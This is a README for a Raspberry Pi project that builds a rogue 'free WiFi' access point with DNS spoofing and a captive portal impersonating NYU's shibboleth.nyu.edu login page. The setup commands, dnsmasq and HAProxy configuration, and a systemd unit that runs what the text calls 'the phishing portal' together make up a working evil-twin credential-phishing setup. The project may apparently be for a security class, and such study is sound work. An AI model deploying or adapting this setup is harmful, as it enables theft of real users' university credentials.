# Raspberry Pi Project

Materials:
- Raspberry Pi
- microSD card with Raspberry Pi OS Lite
- Peripherals
- USB WiFi adapter with AP mode supported

### Instructions

reference: https://raspberrytips.com/access-point-setup-raspberry-pi/, chatgpt :), https://gist.github.com/theprojectsomething/a8406ba6be3ed3335fb3a2e5efea4b41
Instructions start from a Raspberry Pi with Raspberry Pi OS Lite, WiFi adapter, etc. all connected. You are logged in through SSH through Ethernet.

1. Update the OS.

```bash
sudo apt update
sudo apt full-upgrade
sudo reboot
```

2. Update the Raspberry Pi config.

```bash
sudo raspi-config
```

3. Install Node.js, NPM and HAProxy.

```bash
sudo apt install nodejs npm haproxy
```

4. Clone the project and install dependencies.

```bash
git clone https://github.com/acandoo/fake-login-screen.git
cd fake-login-screen
npm install
```

5. Check the interface name of the USB WiFi adapter.

```bash
ip link show
```
The rest of these instructions assume the USB WiFi adapter is on interface wlan1 and the Pi's internal WiFi on wlan0.

6. Switch to wlan1 for wireless connections, and configure NetworkManager for the adapter to act as a WiFi hotspot

```bash
sudo nmcli connection up preconfigured ifname wlan1
sudo nmcli con add con-name CS4CS ifname wlan0 type wifi ssid "CS4CS-Free-WiFi"
sudo nmcli con modify CS4CS 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
```

7. Setup dnsmasq

In `/etc/NetworkManager/NetworkManager.conf`:

```
[main]
# ...insert previous config
dns=dnsmasq
# ...insert config after
```

In `/etc/NetworkManager/dnsmasq.d/dnsmasq.conf`:

```
# dhcp range for the hotspot network
dhcp-range=10.42.0.10,10.42.0.100,12h

# set the router IP (the hotspot IP)
dhcp-option=3,10.42.0.1

# advertise modern captive portal (uses HTTP so no SSL cert needed (!))
dhcp-option-force=114,http://shibboleth.nyu.edu/captive-api

# force all DNS queries to return your portal IP (DNS spoofing)
address=/#/10.42.0.1

# some global options
domain-needed
bogus-priv
expand-hosts
```

Then restart NetworkManager:

```bash
sudo systemctl restart NetworkManager
```

8. Setup HAProxy

```bash
sudo cp /etc/haproxy/haproxy.cfg /etc/haproxy/haproxy.cfg.bak
```

In `/etc/haproxy/haproxy.cfg`:
```
# /etc/haproxy/haproxy.cfg
# HAProxy config with optional HTTPS (to enable follow steps 1-4 below)
global
  log /dev/log    local0
  log /dev/log    local1 notice
  chroot /var/lib/haproxy
  stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
  stats timeout 30s
  user haproxy
  group haproxy
  daemon

  # (these lines are likely out of date - you might consider updating them)
  # See: https://ssl-config.mozilla.org/#server=haproxy&server-version=2.0.3&config=intermediate
  ssl-default-server-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-CHACHA20-POLY1305
  ssl-default-server-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
  ssl-default-server-options ssl-min-ver TLSv1.2 no-tls-tickets
  tune.ssl.default-dh-param 2048

defaults
  log     global
  mode    http
  option  httplog
  option  dontlognull
  timeout connect 5000
  timeout client  50000
  timeout server  50000
  errorfile 400 /etc/haproxy/errors/400.http
  errorfile 403 /etc/haproxy/errors/403.http
  errorfile 408 /etc/haproxy/errors/408.http
  errorfile 500 /etc/haproxy/errors/500.http
  errorfile 502 /etc/haproxy/errors/502.http
  errorfile 503 /etc/haproxy/errors/503.http
  errorfile 504 /etc/haproxy/errors/504.http

frontend localhost
  bind *:80
  ###
  # HTTPS STEP 1: uncomment line 42 below
  # - binds to port 443 with our combined certificate (don't forget to update the domain)
  ###
  # bind *:443 ssl crt /etc/haproxy/certs/captivity.bytes.pem
  mode http

  # match our primary domain
  acl is_portal hdr(host) -i shibboleth.nyu.edu

  # match OS-specific captive portal checks
  acl is_captive_modern path_beg /captive-api
  acl is_captive_apple hdr(host) -f /etc/haproxy/captive/captive-apple.lst
  acl is_captive_android hdr(host) -f /etc/haproxy/captive/captive-android.lst
  # acl is_captive hdr(User-Agent) -i CaptiveNetworkSupport

  ###
  # HTTPS STEP 2: comment line 58 below and uncomment line 59
  # - redirects to our base domain if nothing matches
  ###
  http-request redirect code 302 location http://shibboleth.nyu.edu if !is_portal !is_captive_apple !is_captive_android
  # http-request redirect code 302 location https://captivity.bytes if !is_portal !is_captive_apple !is_captive_android

  ###
  # HTTPS STEP 3: uncomment line 65 below
  # - redirects all requests to https
  ###
  # redirect scheme https if !{ ssl_fc } is_portal

  # send traffic to captive responses or portal
  use_backend captive_modern if is_captive_modern
  use_backend captive_apple if is_captive_apple
  use_backend captive_android if is_captive_android
  use_backend portal if is_portal

backend portal
  mode http
  balance roundrobin
  option forwardfor
  option httpchk HEAD / HTTP/1.1\r\nHost:localhost
  server portal 127.0.0.1:8080 check
  http-request set-header X-Forwarded-Port %[dst_port]
  ###
  # HTTPS STEP 4: uncomment line 84 below
  # - adds https redirect/forwarding header
  ###
  # http-request add-header X-Forwarded-Proto https if { ssl_fc }

backend captive_modern
  errorfile 503 /etc/haproxy/captive/captive-modern.http

backend captive_apple
  errorfile 503 /etc/haproxy/captive/captive-apple.http

backend captive_android
  errorfile 503 /etc/haproxy/captive/captive-android.http

# HAProxy Stats GUI - don't forget to update "user:pass" below (!)
listen stats
  bind              0.0.0.0:8888
  mode              http
  stats             enable
  option            httplog
  stats             show-legends
  stats             uri /
  stats             realm Haproxy\ Statistics
  stats             refresh 5s
  stats             auth cs4cs:password123
```

Now put the other captive checks (too lazy to put here so check the referenced gist and make modifications as necessary)
https://gist.github.com/theprojectsomething/a8406ba6be3ed3335fb3a2e5efea4b41

9. Run the phishing portal as a systemd service.
```
# /home/cs4cs/.config/systemd/user/captiveportal.service
[Unit]
Description=systemd captive portal node.js startup
After=network.target

[Service]
WorkingDirectory=%h/fake-login-screen
ExecStart=/usr/bin/node %h/fake-login-screen/index.js
Environment="PATH=/usr/bin:/usr/local/bin"
Environment=NODE_ENV=production
ExecReload=/bin/kill -s HUP $MAINPID
KillMode=mixed
TimeoutStopSec=5
PrivateTmp=true
Restart=on-failure

[Install]
WantedBy=default.target
```

```bash
systemctl --user daemon-reload
systemctl --user enable --now captiveportal.service
```
